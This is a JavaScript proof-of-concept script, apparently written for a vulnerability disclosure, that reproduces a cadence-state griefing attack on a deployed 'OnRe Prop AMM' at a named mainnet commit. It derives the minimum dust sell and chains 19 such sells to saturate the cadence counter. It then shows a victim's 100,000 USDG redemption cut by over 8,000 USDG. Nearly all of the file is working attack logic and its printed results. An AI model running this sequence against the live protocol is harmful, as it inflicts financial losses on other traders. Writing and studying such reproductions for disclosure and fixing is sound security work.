"use strict";

// Dependency-free model of the deployed Prop AMM cadence path at mainnet-live
// commit 1dbc6ec0ed18a8fc81516f930d85e669b689d852.

const SCALE = 1_000_000_000_000n;
const BPS = 10_000n;
const CADENCE_SCALE = 10_000n;
const CADENCE_EASE = 8n;
const CADENCE_CAP_DIVISOR = 3n;
const WALL_SENSITIVITY_SCALE = 10_000n;
const Q_SHIFT = 40n;
const Q = 1n << Q_SHIFT;
const LN2_Q = 762_123_384_786n;
const LOG2_E_Q = 1_586_259_972_792n;
const LOG2_SCALE_Q = 43_829_982_801_540n;

const live = Object.freeze({
  price: 1_146_249_154n,
  liquidity: 2_499_965_861_190n,
  sellFeeBps: 20n,
  curvePegHaircutBps: 700n,
  curveExponent: 2.5,
  cadenceThreshold: 20n,
  cadenceWaveScaled: 10_000n,
  wallSensitivityScaled: 20_000n,
  minimumSellHaircutOnyc: 0n,
  currentSellValue: 5_718_071n,
  currentBuyValue: 0n,
  currentSellCount: 1n,
});

function assert(condition, message) {
  if (!condition) throw new Error(`PoC assertion failed: ${message}`);
}

function ceilDiv(value, divisor) {
  return (value + divisor - 1n) / divisor;
}

function redemptionRawOutput(grossOnyc) {
  const percentageFee = ceilDiv(grossOnyc * live.sellFeeBps, BPS);
  const fee = percentageFee > live.minimumSellHaircutOnyc
    ? percentageFee
    : live.minimumSellHaircutOnyc;
  assert(grossOnyc >= fee, "gross sell must cover its fee");
  const netOnyc = grossOnyc - fee;
  return { fee, netOnyc, rawOut: netOnyc * live.price / SCALE };
}

function dynamicWall(rawOut, currentSellValue) {
  const currentNet = currentSellValue > live.currentBuyValue
    ? currentSellValue - live.currentBuyValue
    : 0n;
  const effectiveVolume = currentNet + rawOut;
  const sensitivityComponent = live.wallSensitivityScaled * effectiveVolume / live.liquidity;
  const denominator = WALL_SENSITIVITY_SCALE + sensitivityComponent;
  const wall = live.liquidity * WALL_SENSITIVITY_SCALE / denominator;
  return wall > 0n ? wall : 1n;
}

function cadenceHaircut(utilization, sellCount) {
  if (utilization === 0n || sellCount === 0n) return 0n;
  const cappedCount = sellCount < live.cadenceThreshold
    ? sellCount
    : live.cadenceThreshold;
  const ramp = cappedCount * CADENCE_SCALE / live.cadenceThreshold;
  const waveY = live.cadenceWaveScaled * ramp / CADENCE_SCALE;
  const normalized = utilization < SCALE ? utilization : SCALE;
  const remaining = SCALE - normalized;
  const easedNumerator = normalized * CADENCE_EASE;
  const easedRise = easedNumerator * SCALE / (easedNumerator + remaining);
  const target = easedRise * waveY / (CADENCE_SCALE * CADENCE_CAP_DIVISOR);
  return target < SCALE ? target : SCALE;
}

function mostSignificantBit(value) {
  return BigInt(value.toString(2).length - 1);
}

function log2IntegerQ(value) {
  const msb = mostSignificantBit(value);
  const shift = msb - Q_SHIFT;
  const mantissaQ = shift >= 0n ? value >> shift : value << -shift;
  const z = (mantissaQ - Q) * Q / (mantissaQ + Q);
  const z2 = z * z >> Q_SHIFT;
  let term = z;
  let sum = term;
  for (const divisor of [3n, 5n, 7n, 9n, 11n, 13n]) {
    term = term * z2 >> Q_SHIFT;
    sum += term / divisor;
  }
  const fractionalQ = (sum * 2n) * LOG2_E_Q >> Q_SHIFT;
  return msb * Q + fractionalQ;
}

function exp2ScaledQ(log2ValueQ) {
  let integerPart = log2ValueQ / Q;
  let fractionalPart = log2ValueQ % Q;
  if (fractionalPart < 0n) {
    fractionalPart += Q;
    integerPart -= 1n;
  }
  const xQ = fractionalPart * LN2_Q >> Q_SHIFT;
  let term = Q;
  let expFractionQ = Q;
  for (const divisor of [1n, 2n, 3n, 4n, 5n, 6n, 7n, 8n, 9n, 10n]) {
    term = term * xQ >> Q_SHIFT;
    term /= divisor;
    expFractionQ += term;
  }
  const scaled = expFractionQ * SCALE >> Q_SHIFT;
  return integerPart >= 0n ? scaled << integerPart : scaled >> -integerPart;
}

function baseHaircut(utilization) {
  if (utilization === 0n) return 0n;
  const log2UtilizationQ = log2IntegerQ(utilization) - LOG2_SCALE_Q;
  // The deployed exponent is 25,000 / 10,000 = 2.5.
  const exponentiatedLogQ = log2UtilizationQ * 25_000n / 10_000n;
  const utilizationPower = exp2ScaledQ(exponentiatedLogQ);
  const pegHaircut = SCALE * live.curvePegHaircutBps / BPS;
  return pegHaircut * utilizationPower / SCALE;
}

function quote(rawOut, currentSellValue, sellCount) {
  const wall = dynamicWall(rawOut, currentSellValue);
  const utilization = rawOut === wall ? SCALE : rawOut * SCALE / wall;
  const haircut = [baseHaircut(utilization), cadenceHaircut(utilization, sellCount)]
    .reduce((a, b) => (a > b ? a : b));
  const factor = haircut < SCALE ? SCALE - haircut : 0n;
  return { wall, utilization, haircut, output: rawOut * factor / SCALE };
}

let dustGross = 1n;
while (redemptionRawOutput(dustGross).rawOut === 0n) dustGross += 1n;
const dust = redemptionRawOutput(dustGross);
assert(dustGross === 875n, "live minimum nonzero sell should be 875 ONyc base units");
assert(dust.rawOut === 1n, "dust sell must have a nonzero raw USDG output");

let sellCount = live.currentSellCount;
let sellValue = live.currentSellValue;
const dustTrades = Number(live.cadenceThreshold - sellCount);
for (let i = 0; i < dustTrades; i += 1) {
  const dustQuote = quote(dust.rawOut, sellValue, sellCount);
  assert(dustQuote.output === 1n, `dust sell ${i + 1} must execute with minimum_out=1`);
  sellValue += dust.rawOut;
  sellCount += 1n;
}

assert(sellCount === live.cadenceThreshold, "dust sells must saturate the cadence counter");
const totalDustGross = dustGross * BigInt(dustTrades);
assert(totalDustGross < 17_000n, "total dust input must remain below 0.000017 ONyc");

const victimRaw = 100_000_000_000n;
const honest = quote(victimRaw, live.currentSellValue, live.currentSellCount);
const poisoned = quote(victimRaw, sellValue, sellCount);
const reduction = honest.output - poisoned.output;
assert(reduction > 8_000_000_000n, "victim reduction must exceed 8,000 USDG");

function units(value, decimals) {
  const scale = 10n ** BigInt(decimals);
  const whole = value / scale;
  const fraction = (value % scale).toString().padStart(decimals, "0").replace(/0+$/, "");
  return fraction ? `${whole}.${fraction}` : `${whole}`;
}

console.log("OnRe Prop AMM cadence-state griefing reproduced");
console.log(`dust trades required:       ${dustTrades}`);
console.log(`gross input per dust sell:  ${units(dustGross, 9)} ONyc`);
console.log(`total gross dust input:     ${units(totalDustGross, 9)} ONyc`);
console.log(`output per dust sell:       ${units(dust.rawOut, 6)} USDG`);
console.log(`victim output before:       ${units(honest.output, 6)} USDG`);
console.log(`victim output after:        ${units(poisoned.output, 6)} USDG`);
console.log(`attacker-induced reduction: ${units(reduction, 6)} USDG`);
